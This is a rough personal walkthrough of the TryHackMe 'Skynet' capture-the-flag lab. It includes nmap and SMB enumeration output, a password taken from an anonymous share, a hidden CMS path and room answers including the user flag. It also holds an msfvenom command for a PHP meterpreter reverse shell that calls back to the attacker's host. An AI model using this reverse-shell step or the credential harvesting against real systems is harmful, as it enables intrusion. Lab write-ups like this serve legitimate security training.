@@ -1,0 +1,599 @@
+THM----------> Terminator Room
+
+'''
+export ip=10.10.77.240
+
+'''
+Scanning & Recon 
+
+'''
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-08 09:29 IST
+NSE: Loaded 45 scripts for scanning.
+Initiating Ping Scan at 09:29
+Scanning 10.10.77.240 [4 ports]
+Completed Ping Scan at 09:29, 0.45s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 09:29
+Completed Parallel DNS resolution of 1 host. at 09:29, 0.00s elapsed
+Initiating SYN Stealth Scan at 09:29
+Scanning 10.10.77.240 [1000 ports]
+Discovered open port 445/tcp on 10.10.77.240
+Discovered open port 143/tcp on 10.10.77.240
+Discovered open port 139/tcp on 10.10.77.240
+Discovered open port 110/tcp on 10.10.77.240
+Discovered open port 22/tcp on 10.10.77.240
+Discovered open port 80/tcp on 10.10.77.240
+Completed SYN Stealth Scan at 09:29, 7.29s elapsed (1000 total ports)
+Initiating Service scan at 09:29
+Scanning 6 services on 10.10.77.240
+Completed Service scan at 09:29, 12.28s elapsed (6 services on 1 host)
+NSE: Script scanning 10.10.77.240.
+NSE: Starting runlevel 1 (of 2) scan.
+Initiating NSE at 09:29
+Completed NSE at 09:29, 1.75s elapsed
+NSE: Starting runlevel 2 (of 2) scan.
+Initiating NSE at 09:29
+Completed NSE at 09:29, 1.68s elapsed
+Nmap scan report for 10.10.77.240
+Host is up, received echo-reply ttl 61 (0.42s latency).
+Scanned at 2021-01-08 09:29:24 IST for 24s
+Not shown: 994 closed ports
+Reason: 994 resets
+PORT    STATE SERVICE     REASON         VERSION
+22/tcp  open  ssh         syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+80/tcp  open  http        syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
+110/tcp open  pop3        syn-ack ttl 61 Dovecot pop3d
+139/tcp open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+143/tcp open  imap        syn-ack ttl 61 Dovecot imapd
+445/tcp open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-08 09:26 IST
+Nmap scan report for 10.10.77.240
+Host is up (0.39s latency).
+Not shown: 994 closed ports
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
+|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
+|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
+80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Skynet
+110/tcp open  pop3        Dovecot pop3d
+|_pop3-capabilities: AUTH-RESP-CODE RESP-CODES TOP CAPA UIDL PIPELINING SASL
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+143/tcp open  imap        Dovecot imapd
+|_imap-capabilities: post-login more Pre-login IDLE OK LOGINDISABLEDA0001 capabilities LITERAL+ have LOGIN-REFERRALS SASL-IR ENABLE listed ID IMAP4rev1
+445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.91%E=4%D=1/8%OT=22%CT=1%CU=36558%PV=Y%DS=4%DC=T%G=Y%TM=5FF7D82E
+OS:%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)SEQ(
+OS:SP=101%GCD=1%ISR=10D%TI=Z%II=I%TS=8)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3
+OS:=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=68DF%W2=6
+OS:8DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW
+OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
+OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
+OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=
+OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
+OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 4 hops
+Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 2h00m45s, deviation: 3h27m51s, median: 45s
+|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: skynet
+|   NetBIOS computer name: SKYNET\x00
+|   Domain name: \x00
+|   FQDN: skynet
+|_  System time: 2021-01-07T21:58:03-06:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-01-08T03:58:03
+|_  start_date: N/A
+
+
+
+'''
+
+Dirctrory Scan
+
+'''
+
+
+/index.html (Status: 200)
+/image.png (Status: 200)
+/admin (Status: 301)
+/css (Status: 301)
+/style.css (Status: 200)
+/js (Status: 301)
+/config (Status: 301)
+/ai (Status: 301)
+/squirrelmail
+
+
+
+'''
+
+'''
+
+Downloaded image.png from http://10.10.77.240/image.png and checked for hashsum 
+ 
+Hash---->13c669b13eec8cfa0ba430100082cd47
+
+strings image.png ------>
+IHDR
+a~IDATx
+DCGA
+w|||}x.r
+Q	~&
+?AgL
+Xh+..
+TZx7p
+*$D 
+<y4hT
+Z|||
+M(n(`
+$___
+.x/\
+p9<<|ZDD
+(`;&a
+E`)<
+BCCg
+R`\X
+z$''
+!zgtu*
+cTxx
+6oS(
+Dy|"
+"bbb
+E///
+bcc#N
+j+c;j
+u>((hY
+57@.@2p
+n$%%
+b^O4
+ eis
+<]5j
+`j$-]
+2eJdRRR!
+NP&hG
+}T@4
+fHFt
+$44tt
+(...|
+6lx',,lR
+FDD,
+	9RRR*e
+58\\(
+rXXXl
+0QGK
+^= w
+dMJJj
+i@bbb
+'O6X
+DEE}0y
+g.z8
+hyf6B
+qlll
+&<!,
+| 444
+n]1{
+MHHh2w
+GDDL
+q?P*
+k!!!
+rIII
+*U:i
+;**j
+W<@6
+6gq&Z
+L3cv
+wJNN
+:			
+fodc
+*""b
+~LLL?Z
+c0gz[
+u"m{
+9jnHH
++W>o
+J+=~
+RRRr
+1V^tD-
+\_f- 
+U*+&''
+`+zk
+'s}Y
+&Lxk
+Pdp$&&
+Kf/|
+.(/V
+@f#P
+Wlll
+Wrrr
+M*@<
+7<<|
+8c}p
+8C8N
+'N|o
+^lNGO
+'~~~
+1Mfm
+S4e}
+#444
+<:'$$
+,b:@&`
+6mze
+w|||
+dI#so
+Pdpl
+FIII
+OF4(\a
+;#hG
+'$""
+qqq!
+OF6d
+gbbbN
+[W]`
+e%qb
+<C0>
+@4!sPk
++Wr2
+#-xZ
+ge %
+hRRR
+n|||!
+yS<9
+0`Hxx
+MCnQ
+xcphh
+ hLO
+1u>]_
+XU5{
+T9_rN
+buod
+y=UGV
+QA@@
+W6C0
+/C0z
+juB%
+GA`=
+BAaJAJ
+>$$dN
+njjj
+Uxkdv
+U;+.
+mhhh
+#KF66
+M\pp
+jrrr^d
+p:Phk
+]bYzd3a=
+p,RSS
+=ZAG1
+P8zO
+{lll
+7o^3C&
+AAAK
+DC<F'''{
+9AAA
+d[TL
+%22r
+772I
+Gbbb
+$''?
+aQQQ
+fGM{x-4
+`#< 
+~~~	
+0|qt
+Yttt
+6mZXDD
+uJ4\
+rzyyy$''
++V h4
+MUU(
+.88xy
+z/!!!
+4W6n
+:U0,,lr
+c=4555
+}XXX
+N	jt
+	*y6i
+>:>>
+;5EU
+C=55
+[qrp
+2!!!
+Y]/\
+`d-n
+p_0>C
++&(((
+G%l~
+}`P(kK
+GBBB
+=zD7j
+nQx3
+C|||M
+kAAA	
+P8O~CO
+Q			
+wxhf
+Vy@y
+}G6n
+HJJ*
+HD8FZ
+?CX`~hu
+3V{D
+#F|t
+kHHHr
+1.D]
+mu X
+dAfj
+^^^y
+@A,<d
+f9sOn
+ww0{7;D>
+/[wO
+VkKJJ
+Fjjj
+,~Yp
+`.Xh
+GXXXfg
+ KdSy
+>]"::
+`6ch
+dykV
+W{=h
+`/bOJ/
+?6q3
+#)NK
+]6X!K
+JbaO 
+%=Zr
+1I|(
+=b'_
+q[-p-IO0
+c,=x
+Z2+Z
+91H 
+`nksG
+!c"+
+fD+S
+d%IR
+S9^V
+>>>#|}}?6
+?&(00
+U(  
+&-|G
+-Z4MAs2
+t6f\
+j)Fg
+VK-=
+E!!!q
+Yog\
+~~~v
+1(4&x
+BMdA
+^&yL
+Wbcc
+et>I
+{Y$V
+&&&z
+3(G{
+^ZoRqe
+tVyfm
+bUOf
+`9{nug
+[b]x
+B1ie
+Bw$S
+a*!I
+4iR#(3
+Dk	aY|F
+w4=7
+ZYBYf
+ck2i*/y
+\(20
+5,hh
+r_Ir.
+oH9O
+2PUZ
+9T*7
+3@A@W>
+w*7n
+f]_3
+^XnG4$
+9;-9kE>kO
+eie<
+Iyl.Sa
+n(/_z
+c^Gu
+wh0Gz
+d'c6V
+kd'k
+B```I#0k
+yFH%G
+e$83#d
+IkSV?
+h)rc150
+f~~~qJ4
+^e	m{
+`GKz
+OF$M
+0((hY
+JZnb
+1,R(
+z/e|
+hM''A
+){d_
+=YNh|Q
+lXeU
+^DCf
+YyfNBo
+,bGc
+TI e
+d={+q
+ldVn
+yyy]v
+Y,{h
+td,92
+Ik	~
+^$*"
+{.gy<"
+b6Z!#<_2
++Z;f
+IEND
+
+strings image.png -n 8
+
+w|||}x.r
+p9<<|ZDD
+2eJdRRR!
+6lx',,lR
+]bYzd3a=
+DC<F'''{
+rzyyy$''
+ww0{7;D>
+q[-p-IO0
+>>>#|}}?6
+9;-9kE>kO
+B```I#0k
+b6Z!#<_2
+
+
+
+'''
+
+SMB-Enumeration
+
+'''
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-08 09:56 IST
+Nmap scan report for 10.10.77.240
+Host is up (0.42s latency).
+
+PORT    STATE SERVICE
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-enum-shares: 
+|   account_used: guest
+|   \\10.10.77.240\IPC$: 
+|     Type: STYPE_IPC_HIDDEN
+|     Comment: IPC Service (skynet server (Samba, Ubuntu))
+|     Users: 1
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   \\10.10.77.240\anonymous: 
+|     Type: STYPE_DISKTREE
+|     Comment: Skynet Anonymous Share
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\srv\samba
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   \\10.10.77.240\milesdyson: 
+|     Type: STYPE_DISKTREE
+|     Comment: Miles Dyson Personal Share
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\home\milesdyson\share
+|     Anonymous access: <none>
+|     Current user access: <none>
+|   \\10.10.77.240\print$: 
+|     Type: STYPE_DISKTREE
+|     Comment: Printer Drivers
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\var\lib\samba\printers
+|     Anonymous access: <none>
+|_    Current user access: <none>
+
+
+
+'''
+
+'''
+SMB anonymous share let us access its share without any password and then let us all the user password of Miles.
+Password found= cyborg007haloterminator
+
+I can assess the mail of MilesDyson 
+
+name = milesdyson
+password = cyborg007haloterminator
+
+Got to check the reset password mail 
+
+'''' 
+)s{A&2Z=F^n_E.B`
+'''' 
+
+where new password might be in encrypted way..Trying applying johntheRipper to crack the hash(maybe).
+
+Checking for hidden files
+
+
+Let's try this share ------> \\10.10.77.240\milesdyson
+
+
+'''
+
+'''
+
+In notes/important.txt
+
+```
+1. Add features to beta CMS /45kra24zxs28v3yd
+2. Work on T-800 Model 101 blueprints
+3. Spend more time with my wife
+```
+
+
+What is the hidden directory?
+/45kra24zxs28v3yd
+
+What is the vulnerability called when you can include a remote file for malicious purposes?
+Remote file inclusion
+
+
+Payload created for Remote File Inclusion
+
+msfvenom -p php/meterpreter_reverse_tcp LHOST=10.2.59.217 LPORT=9999 -f raw > shell.php
+[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+[-] No arch selected, selecting arch: php from the payload
+No encoder specified, outputting raw payload
+Payload size: 34278 bytes
+
+Above payload was not that interactive that's why used generic webshell php_reverse_shell;
+Then got the user flag
+
+What is the user flag?
+7ce5c2109a40f958099283600a9ae807
+
+
+
+What is the root flag?
+
+
+'''
